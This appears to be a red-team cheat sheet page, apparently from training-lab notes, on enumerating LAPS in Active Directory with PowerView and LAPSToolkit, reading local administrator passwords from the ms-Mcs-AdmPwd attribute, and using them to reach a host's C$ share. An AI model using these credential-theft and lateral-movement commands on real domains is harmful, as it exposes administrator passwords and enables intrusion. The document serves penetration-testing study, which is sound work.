## LAPS Enumeration [t-ad-laps-laps_basics]

LAPS Enumeration

### 1.1.1 LAPS Enumeration




**option 1: Powerview.ps1**

{% code overflow="wrap" %}
```bash
#check for related policies
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

#As well as computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property).
Get-DomainComputer | ? { $_."ms-Mcs-AdmPwdExpirationTime" -ne $null } | select dnsHostName

#If we locate the correct GPO, we can download the LAPS configuration from the gpcfilesyspath.
type \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{2BE4337D-D231-4D23-A029-7B999885E659}\Machine
download \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{2BE4337D-D231-4D23-A029-7B999885E659}\Machine\Registry.pol
Parse-PolFile .\Desktop\Registry.pol

#We can discover which principals are allowed to read the ms-Mcs-AdmPwd attribute by reading its DACL on each computer object.
Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "ms-Mcs-AdmPwd" -and $_.ActiveDirectoryRights -match "ReadProperty" } | select 

```
{% endcode %}


**option 2: LAPSToolkit.ps1**

{% code overflow="wrap" %}
```bash
Import-Module C:\Tools\LAPSToolkit\LAPSToolkit.ps1
Find-LAPSDelegatedGroups

#Find-AdmPwdExtendedRights goes a little deeper and queries each individual computer for users that have "All Extended Rights".  This will reveal any users that can read the attribute without having had it specifically delegated to them.
Find-AdmPwdExtendedRights

```
{% endcode %}

### 1.1.2 Reveal a password




**option 1: LAPSToolkit.ps1**

{% code overflow="wrap" %}
```bash
Get-LAPSComputers
```
{% endcode %}


**option 2: Powerview.ps1**

{% code overflow="wrap" %}
```bash
Get-DomainComputer -Identity wkstn-1 -Properties ms-Mcs-AdmPwd
```
{% endcode %}

### 1.1.3 Use the password



{% code overflow="wrap" %}
```bash
make_token .\LapsAdmin password
ls \\hostname\c$
```
{% endcode %}

